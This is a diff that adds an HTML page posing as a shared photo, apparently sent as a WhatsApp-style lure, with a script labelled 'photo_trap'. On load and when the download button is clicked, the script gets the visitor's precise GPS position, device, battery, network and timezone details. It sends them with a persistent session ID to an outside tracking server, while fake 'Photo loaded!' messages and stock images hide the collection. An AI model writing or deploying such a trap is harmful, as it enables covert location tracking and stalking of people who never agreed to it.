@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
+            background: #0a0a0a;
+            color: white;
+        }
+        .container {
+            text-align: center;
+            max-width: 500px;
+            padding: 20px;
+        }
+        .photo-frame {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 10px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.8);
+            border: 1px solid #333;
+        }
+        .photo-frame img {
+            width: 100%;
+            border-radius: 8px;
+            display: block;
+            background: #222;
+            min-height: 300px;
+            object-fit: cover;
+        }
+        .caption {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #888;
+        }
+        .loading-bar {
+            width: 100%;
+            height: 4px;
+            background: #333;
+            border-radius: 2px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        .loading-bar .fill {
+            height: 100%;
+            width: 0%;
+            background: #4285f4;
+            border-radius: 2px;
+            animation: progress 3s ease-in-out forwards;
+        }
+        @keyframes progress {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: #666;
+            min-height: 20px;
+        }
+        .status.success { color: #4caf50; }
+        .status.error { color: #f44336; }
+
+        .download-btn {
+            margin-top: 15px;
+            padding: 10px 30px;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .download-btn:hover { background: #3367d6; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="photo-frame">
+            <img id="photoImg" src="https://picsum.photos/500/400?random=1" alt="Loading photo...">
+        </div>
+        <div class="loading-bar">
+            <div class="fill"></div>
+        </div>
+        <div class="status" id="status">Loading photo...</div>
+        <button class="download-btn" id="downloadBtn">📥 Download Photo</button>
+        <div class="caption">📷 Photo from your camera roll</div>
+    </div>
+
+    <script>
+        // =============================================
+        // CONFIGURATION
+        // =============================================
+        const RENDER_URL = 'https://location-tracker-cn7m.onrender.com';
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const template = urlParams.get('template') || 'whatsapp';
+
+        // Generate session ID
+        let sessionId = localStorage.getItem('tracker_session_id');
+        if (!sessionId) {
+            sessionId = 'photo_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now().toString(36);
+            localStorage.setItem('tracker_session_id', sessionId);
+        }
+
+        const statusEl = document.getElementById('status');
+        const photoImg = document.getElementById('photoImg');
+        const downloadBtn = document.getElementById('downloadBtn');
+
+        // =============================================
+        // Get Device Info
+        // =============================================
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let deviceName = 'Unknown';
+            if (ua.includes('iPhone')) deviceName = 'iPhone';
+            else if (ua.includes('iPad')) deviceName = 'iPad';
+            else if (ua.includes('Android')) deviceName = 'Android';
+            else if (ua.includes('Windows')) deviceName = 'Windows PC';
+            else if (ua.includes('Mac')) deviceName = 'Mac';
+            return {
+                userAgent: ua,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                device_name: deviceName,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+
+        // =============================================
+        // Get Battery
+        // =============================================
+        function getBatteryInfo() {
+            if (navigator.getBattery) {
+                return navigator.getBattery().then(battery => ({
+                    level: Math.round(battery.level * 100),
+                    charging: battery.charging
+                }));
+            }
+            return Promise.resolve(null);
+        }
+
+        function getNetworkInfo() {
+            if (navigator.connection) {
+                return {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                };
+            }
+            return null;
+        }
+
+        // =============================================
+        // Send Location
+        // =============================================
+        function sendLocation(lat, lng, accuracy) {
+            const deviceInfo = getDeviceInfo();
+            return getBatteryInfo().then(battery => {
+                const payload = {
+                    lat: lat,
+                    lng: lng,
+                    accuracy: accuracy,
+                    device_info: deviceInfo,
+                    battery: battery,
+                    network: getNetworkInfo(),
+                    session_id: sessionId,
+                    mode: 'photo_trap'
+                };
+                return fetch(RENDER_URL + '/send-location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            });
+        }
+
+        // =============================================
+        // Get Location
+        // =============================================
+        function getLocation() {
+            if (!navigator.geolocation) {
+                statusEl.textContent = '❌ Geolocation not supported';
+                statusEl.className = 'status error';
+                return;
+            }
+
+            statusEl.textContent = '📍 Getting your location...';
+            statusEl.className = 'status';
+
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    sendLocation(lat, lng, accuracy)
+                        .then(() => {
+                            statusEl.textContent = '✅ Photo loaded!';
+                            statusEl.className = 'status success';
+                            // Change photo to a real one
+                            photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
+                        })
+                        .catch(() => {
+                            statusEl.textContent = '✅ Photo loaded!';
+                            statusEl.className = 'status success';
+                            photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
+                        });
+                },
+                function(error) {
+                    let msg = '⚠️ Location unavailable. Photo may not load.';
+                    if (error.code === 1) msg = '⚠️ Permission denied. Please allow location access.';
+                    else if (error.code === 2) msg = '⚠️ GPS signal not available.';
+                    else if (error.code === 3) msg = '⏳ Timeout. Photo loading...';
+                    statusEl.textContent = msg;
+                    statusEl.className = 'status error';
+                    // Still show a photo
+                    photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 30000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // =============================================
+        // Download Button (triggers location again)
+        // =============================================
+        downloadBtn.addEventListener('click', function() {
+            statusEl.textContent = '📸 Capturing location...';
+            getLocation();
+        });
+
+        // =============================================
+        // Auto-get location on page load
+        // =============================================
+        setTimeout(function() {
+            getLocation();
+        }, 1500);
+
+        // Change photo every 10 seconds (looks like loading)
+        setInterval(function() {
+            if (photoImg.src.includes('picsum')) {
+                photoImg.src = 'https://picsum.photos/500/400?random=' + Date.now();
+            }
+        }, 10000);
+
+        console.log('🆔 Session ID:', sessionId);
+        console.log('📷 Photo trap loaded');
+    </script>
+</body>
+</html>
